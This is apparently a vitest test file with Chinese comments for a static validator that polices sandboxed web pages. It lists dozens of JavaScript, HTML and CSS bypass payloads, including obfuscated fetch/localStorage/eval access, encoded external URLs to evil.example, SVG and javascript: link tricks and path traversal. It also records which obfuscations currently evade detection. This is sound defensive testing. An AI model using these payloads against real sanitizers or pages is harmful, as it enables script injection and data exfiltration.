/**
 * 绕过尝试。静态校验必须拦下能静态判定的写法；无法静态判定的写法（运行时才知道的属性名等）
 * 在这里记录当前行为，由真正的安全边界兜底：
 * - CSP（contracts S2）：connect-src 'none'、没有 'unsafe-eval'、img/style/font/media 只放行 assets、Kit 与 data:/blob:；
 * - 沙箱（S1）：只有 allow-scripts，没有 allow-same-origin（localStorage / cookie / indexedDB 抛 SecurityError）、
 *   没有 allow-top-navigation / allow-popups / allow-forms。
 */
import { describe, expect, it } from 'vitest';
import { codes, issuesOf, makeSkeletonPage, run, summary } from '../fixtures.js';

const script = (code: string) => run(makeSkeletonPage({ script: code }));
const body = (html: string) => run(makeSkeletonPage({ body: html }));
const style = (css: string) => run(makeSkeletonPage({ style: css }));

describe('脚本：能静态判定的绕过写法都要报 FORBIDDEN_API', () => {
  const CASES: [string, string][] = [
    ["window['localStorage']", "window['localStorage'].setItem('a', '1');"],
    ['window["local" + "Storage"]（字面量拼接可折叠）', 'window["local" + "Storage"].getItem("a");'],
    ['window[`fetch`]', 'window[`fetch`]("/x");'],
    ["window['fe' + 'tch']", "window['fe' + 'tch']('/x');"],
    ['self.fetch(...)', "self.fetch('/x');"],
    ['globalThis.fetch', "globalThis.fetch('/x');"],
    ['frames.fetch', "frames.fetch('/x');"],
    ["top['location']", "top['location'] = 'https://evil.example';"],
    ["parent['location']", "parent['location'].href = 'https://evil.example';"],
    ['window.top.location.replace', "window.top.location.replace('https://evil.example');"],
    ['可选链 window?.fetch?.()', "window?.fetch?.('/x');"],
    ['顶层 this.fetch', "this.fetch('/x');"],
    ['window.window.self.fetch', "window.window.self.fetch('/x');"],
    ['document.defaultView.fetch', "document.defaultView.fetch('/x');"],
    ['const 别名 w = window', "const w = window; w.fetch('/x');"],
    ['解构 { localStorage } = window', 'const { localStorage: store } = window; store.clear();'],
    ['解构 { fetch } = self', "const { fetch: get } = self; get('/x');"],
    ['const 常量属性名', "const key = 'localStorage'; window[key].clear();"],
    ["atob('bG9jYWxTdG9yYWdl')", "window[atob('bG9jYWxTdG9yYWdl')].clear();"],
    ['String.fromCharCode', 'window[String.fromCharCode(102, 101, 116, 99, 104)]("/x");'],
    ["['fe', 'tch'].join('')", "window[['fe', 'tch'].join('')]('/x');"],
    ['(0, eval)(...)', "(0, eval)('1');"],
    ['把 fetch 赋给变量', "const f = fetch; f('/x');"],
    ['setTimeout 模板字符串', 'setTimeout(`alert(1)`, 10);'],
    ['setInterval 字符串拼接', "setInterval('go' + '()', 10);"],
    ['window.setTimeout("...")', "window.setTimeout('alert(1)', 10);"],
    ['Function(...)', "Function('return this')();"],
    ['new window.Function', "new window.Function('return 1');"],
    ['constructor.constructor', "[].constructor.constructor('return this')();"],
    ['location = ...', "location = 'https://evil.example';"],
    ['window.location = ...', "window.location = 'https://evil.example';"],
    ['document.location.href =', "document.location.href = 'https://evil.example';"],
    ['location 的别名', "const loc = location; loc.href = 'https://evil.example';"],
    ["location['href'] =", "location['href'] = 'https://evil.example';"],
    ['Object.assign(location, ...)', "Object.assign(location, { href: 'https://evil.example' });"],
    ['navigation.navigate', "navigation.navigate('https://evil.example');"],
    ['裸 open(...)', "open('https://evil.example');"],
    ['self.open', "self.open('https://evil.example');"],
    ['innerHTML 注入点里的事件属性', `document.body.innerHTML = '<img src="assets/x.png" onerror="fetch(1)">';`],
    ["setAttribute('onclick', 字符串)", `document.body.setAttribute('onclick', "localStorage.clear()");`],
    ['with (window)', "with (window) { fetch('/x'); }"],
    ['typeof 检测后调用', "if (typeof fetch === 'function') fetch('/x');"],
    ['在别处声明同名局部变量不能遮住全局', "function a() { var fetch = 1; return fetch; } fetch('/x');"],
  ];

  it.each(CASES)('%s', (_label, code) => {
    const report = script(code);
    expect(codes(report), summary(report)).toContain('FORBIDDEN_API');
  });
});

describe('脚本：无法静态判定的写法当前不报（记录行为，由 CSP 与沙箱兜底）', () => {
  const CASES: [string, string, string][] = [
    ['运行时算出的属性名', 'const k = location.hash.slice(1); window[k]();', 'CSP connect-src none / 无 unsafe-eval；沙箱无 allow-same-origin'],
    ['let 变量拼接（会被重新赋值，不折叠）', "let k = 'local'; k += 'Storage'; window[k].clear();", '沙箱无 allow-same-origin，localStorage 抛 SecurityError'],
    ['函数返回值作属性名', "function name() { return 'fe' + 'tch'; } window[name()]('/x');", 'CSP connect-src none'],
    ['Reflect.get(window, "localStorage")', "Reflect.get(window, 'localStorage');", '沙箱无 allow-same-origin'],
    ['reverse 拼出的名字', "window[['hctef'].join('').split('').reverse().join('')]('/x');", 'CSP connect-src none'],
  ];

  it.each(CASES)('%s（兜底：%s）', (_label, code) => {
    const report = script(code);
    // 当前行为：不报。若以后能识别，改成 toContain 即可。
    expect(codes(report)).not.toContain('FORBIDDEN_API');
  });
});

describe('HTML / CSS：编码与大小写变体也要识别', () => {
  it('srcset 中混入外链', () => {
    const report = body('<img src="assets/a.png" srcset="assets/a.png 1x, https://evil.example/b.png 2x" alt="">');
    expect(issuesOf(report, 'EXTERNAL_RESOURCE').map((i) => i.message).join()).toContain('https://evil.example/b.png');
  });

  it('CSS url( "//evil" ) 带空格与引号', () => {
    expect(codes(style('.a { background: url( "//evil.example/x.png" ); }'))).toContain('EXTERNAL_RESOURCE');
    expect(codes(style(".a { background: url( '//evil.example/x.png' ) }"))).toContain('EXTERNAL_RESOURCE');
  });

  it('CSS 函数名大小写与转义：URL(...)、u\\72l(...)', () => {
    expect(codes(style('.a { background: URL(https://evil.example/x.png); }'))).toContain('EXTERNAL_RESOURCE');
    expect(codes(style('.a { background: u\\72l(https://evil.example/x.png); }'))).toContain('EXTERNAL_RESOURCE');
  });

  it('@import 的各种写法', () => {
    expect(codes(style('@import "https://evil.example/a.css";'))).toContain('EXTERNAL_RESOURCE');
    expect(codes(style('@import url(//evil.example/a.css) screen;'))).toContain('EXTERNAL_RESOURCE');
    expect(codes(style('@IMPORT "https://evil.example/a.css";'))).toContain('EXTERNAL_RESOURCE');
    expect(codes(style('@\\69mport "https://evil.example/a.css";'))).toContain('EXTERNAL_RESOURCE');
  });

  it('CSS 字符串里的转义（url("h\\74tps://...")）', () => {
    expect(codes(style('.a { background: url("h\\74tps://evil.example/x.png"); }'))).toContain('EXTERNAL_RESOURCE');
  });

  it('协议大小写：HTTPS://', () => {
    expect(codes(body('<img src="HTTPS://EVIL.EXAMPLE/x.png" alt="">'))).toContain('EXTERNAL_RESOURCE');
    expect(codes(style('.a { background: url(HtTpS://evil.example/x.png); }'))).toContain('EXTERNAL_RESOURCE');
  });

  it('HTML 实体编码的协议：&#104;ttps://、&#x68;ttps:、https&colon;//', () => {
    expect(codes(body('<img src="&#104;ttps://evil.example/x.png" alt="">'))).toContain('EXTERNAL_RESOURCE');
    expect(codes(body('<img src="&#x68;ttps://evil.example/x.png" alt="">'))).toContain('EXTERNAL_RESOURCE');
    expect(codes(body('<img src="https&colon;//evil.example/x.png" alt="">'))).toContain('EXTERNAL_RESOURCE');
  });

  it('协议中间夹 Tab / 换行、首尾空白、反斜杠', () => {
    expect(codes(body('<img src="ht&#9;tps://evil.example/x.png" alt="">'))).toContain('EXTERNAL_RESOURCE');
    expect(codes(body('<img src="ht\ntps://evil.example/x.png" alt="">'))).toContain('EXTERNAL_RESOURCE');
    expect(codes(body('<img src="   https://evil.example/x.png  " alt="">'))).toContain('EXTERNAL_RESOURCE');
    expect(codes(body('<img src="/\\evil.example/x.png" alt="">'))).toContain('EXTERNAL_RESOURCE');
    expect(codes(body('<img src="\\\\evil.example/x.png" alt="">'))).toContain('EXTERNAL_RESOURCE');
  });

  it('assets/ 路径穿越：assets/../x.png、%2e%2e', () => {
    expect(codes(body('<img src="assets/../secret.png" alt="">'))).toContain('EXTERNAL_RESOURCE');
    expect(codes(body('<img src="assets/%2e%2e/%2e%2e/x.png" alt="">'))).toContain('EXTERNAL_RESOURCE');
  });

  it('Kit 路径穿越：/_nowme/kit/v1/../../evil.css', () => {
    const report = body('<link rel="stylesheet" href="/_nowme/kit/v1/../../evil.css">');
    expect(codes(report)).toContain('FORBIDDEN_ELEMENT');
    expect(codes(report)).toContain('EXTERNAL_RESOURCE');
  });

  it('标签与属性大小写：<IMG SRC=...>、<sCrIpT>', () => {
    expect(codes(body('<IMG SRC=https://evil.example/x.png>'))).toContain('EXTERNAL_RESOURCE');
    expect(codes(body("<sCrIpT>fetch('/x')</ScRiPt>"))).toContain('FORBIDDEN_API');
  });

  it('javascript: 链接（含实体编码的 Tab）', () => {
    expect(codes(body('<a href="java&#x09;script:alert(1)">x</a>'))).toContain('FORBIDDEN_LINK_HREF');
    expect(codes(body('<a href="JAVASCRIPT:alert(1)">x</a>'))).toContain('FORBIDDEN_LINK_HREF');
  });

  it('<noscript> 里的外部资源（宁可多报）', () => {
    expect(codes(body('<noscript><img src="https://evil.example/pixel.png"></noscript>'))).toContain('EXTERNAL_RESOURCE');
  });

  it('<template> 里的外部资源与禁用元素', () => {
    const report = body('<template><iframe src="https://evil.example"></iframe><img src="https://evil.example/x.png"></template>');
    expect(codes(report)).toContain('FORBIDDEN_ELEMENT');
    expect(codes(report)).toContain('EXTERNAL_RESOURCE');
  });

  it('SVG 外来内容里的资源与链接', () => {
    expect(codes(body('<svg><image href="https://evil.example/x.png"/></svg>'))).toContain('EXTERNAL_RESOURCE');
    expect(codes(body('<svg><use xlink:href="https://evil.example/s.svg#a"/></svg>'))).toContain('EXTERNAL_RESOURCE');
    expect(codes(body('<svg><a xlink:href="https://evil.example"><text>x</text></a></svg>'))).toContain('FORBIDDEN_LINK_HREF');
    expect(codes(body('<svg><rect fill="url(https://evil.example/p.svg#g)"/></svg>'))).toContain('EXTERNAL_RESOURCE');
    expect(codes(body('<svg><a href="#x"><animate attributeName="href" to="https://evil.example"/></a></svg>'))).toContain('EXTERNAL_RESOURCE');
  });

  it('SVG <foreignObject> 里的 HTML', () => {
    expect(codes(body('<svg><foreignObject><iframe src="https://evil.example"></iframe></foreignObject></svg>'))).toContain('FORBIDDEN_ELEMENT');
  });

  it('a 的 ping 属性', () => {
    expect(codes(body('<a href="#x" ping="https://evil.example/track">x</a>'))).toContain('EXTERNAL_RESOURCE');
  });

  it('脚本注入点里的禁用元素与外部资源', () => {
    expect(codes(script(`document.write('<iframe src="https://evil.example"></iframe>');`))).toContain('FORBIDDEN_ELEMENT');
    expect(codes(script(`el.innerHTML = '<img src="https://evil.example/x.png">';`))).toContain('EXTERNAL_RESOURCE');
    expect(codes(script("el.insertAdjacentHTML('beforeend', `<a href=\"https://evil.example\">x</a>`);"))).toContain('FORBIDDEN_LINK_HREF');
    expect(codes(script("document.createElement('script');"))).toContain('FORBIDDEN_ELEMENT');
    expect(codes(script("document.createElement('IFRAME');"))).toContain('FORBIDDEN_ELEMENT');
  });

  it('style 属性里的外部资源', () => {
    expect(codes(body('<div style="background-image: url(https://evil.example/x.png)">x</div>'))).toContain('EXTERNAL_RESOURCE');
  });

  it('模块脚本的静态 import', () => {
    expect(codes(body(`<script type="module">import x from 'https://evil.example/x.js'; x();</script>`))).toContain('EXTERNAL_RESOURCE');
    expect(codes(body(`<script type="module">export * from '//evil.example/x.js';</script>`))).toContain('EXTERNAL_RESOURCE');
  });
});
